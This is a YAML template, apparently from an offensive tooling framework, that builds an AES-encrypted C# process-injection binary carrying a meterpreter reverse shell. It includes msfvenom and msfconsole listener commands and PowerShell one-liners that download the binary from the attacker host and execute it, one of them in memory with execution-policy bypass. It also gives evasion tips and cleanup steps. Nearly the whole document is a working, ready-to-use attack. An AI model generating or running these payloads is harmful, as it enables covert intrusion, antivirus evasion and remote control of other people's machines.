meta:
  name: "Shellcode Injector, AES (C#)"
  category: "Examples"
  description: |
    Injects AES-256-CBC encrypted shellcode into a remote process using C#.
    Uses strong encryption to evade static analysis and signature detection.
    Targets Windows x64 systems.

    The shellcode is encrypted with AES-256-CBC, and the decryption
    happens at runtime in memory. Key and IV are auto-generated.

  effectiveness: "high"

  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055 - Process Injection"

  artifacts:
    - "Process creation with PROCESS_ALL_ACCESS"
    - "VirtualAllocEx and WriteProcessMemory API calls"
    - "CreateRemoteThread execution"
    - "AES-encrypted shellcode in memory"
    - "System.Security.Cryptography namespace usage"

parameters:
  - name: "target_process"
    type: "string"
    description: "Target process name (e.g., explorer.exe, notepad.exe)"
    required: true
    default: "explorer.exe"

  - name: "lhost"
    type: "ip"
    description: "Listener IP address for reverse shell"
    required: true

  - name: "lport"
    type: "port"
    description: "Listener port for reverse shell"
    required: true
    default: 4444

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: true
    default: "injector.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for compiled executable"
    required: true
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate raw shellcode with msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: |
      msfvenom -p windows/x64/meterpreter_reverse_tcp \
        LHOST={{ lhost }} LPORT={{ lport }} \
        EXITFUNC=thread -f raw
    output_var: "raw_shellcode"

  # Step 2: Base64 encode the raw shellcode for processing
  - type: "script"
    name: "base64_encode_shellcode"
    script: "base64_encode.py"
    args:
      data: "{{ raw_shellcode }}"
      format: "string"
    output_var: "shellcode_b64"

  # Step 3: Encrypt shellcode with AES-256-CBC (auto-generate key & IV)
  - type: "script"
    name: "aes_encryption"
    script: "aes_encrypt.py"
    args:
      data: "{{ shellcode_b64 }}"
      key: "auto"
      iv: "auto"
    output_var: "aes_result"

  # Step 4: Format encrypted shellcode as C# byte array
  - type: "script"
    name: "format_encrypted_payload"
    script: "format_csharp.py"
    args:
      data: "{{ aes_result.encrypted }}"
      var_name: "encryptedShellcode"
      bytes_per_line: 15
    output_var: "csharp_shellcode"

  # Step 5: Format AES key as C# byte array
  - type: "script"
    name: "format_aes_key"
    script: "format_csharp.py"
    args:
      data: "{{ aes_result.key }}"
      var_name: "aesKey"
      bytes_per_line: 16
    output_var: "csharp_key"

  # Step 6: Format AES IV as C# byte array
  - type: "script"
    name: "format_aes_iv"
    script: "format_csharp.py"
    args:
      data: "{{ aes_result.iv }}"
      var_name: "aesIV"
      bytes_per_line: 16
    output_var: "csharp_iv"

output:
  type: "template"
  template: "examples/aes_injector.cs"

  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"

  launch_instructions: |
    # Start Listener

    ```bash
    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set EXITFUNC thread; set ExitOnSession false; exploit -j"
    ```

    # Transfer and Execute

    **Attacker:**
    ```bash
    python3 -m http.server 80
    ```
    
    **Target:**
    ```powershell
    powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} {{ target_process }}"
    ```

    # In-Memory Execution (C# Binary)

    **Attacker:**
    ```bash
    python3 -m http.server 80
    ```
    
    **Target:**
    ```powershell
    powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [AESInjector.Program]::Main(@('{{ target_process }}'))"
    ```

    # Notes
    - Target process: {{ target_process }} (must be running on target)
    - Shellcode encrypted with AES-256-CBC (key and IV embedded in binary)
    - Decryption occurs in-memory before injection
    - Uses VirtualAllocEx, WriteProcessMemory, CreateRemoteThread for injection
    - EXITFUNC=thread ensures clean exit without crashing {{ target_process }}
    - Requires matching architecture (x64 binary â†’ x64 process)
    - May require administrative privileges depending on target process integrity level

    Troubleshooting:
    - Injection fails: Verify target process running with `tasklist | findstr {{ target_process }}`
    - Process not found: Try alternative targets (notepad.exe, explorer.exe, chrome.exe)
    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
    - Access Denied: Target process may be protected (PPL) or running at higher integrity level
    - AV detection: AES helps but may still be caught; consider additional obfuscation
    - Sysmon Event ID 8 (CreateRemoteThread) will fire on injection

    Cleanup:
    On target:
    $ del {{ output_file }}
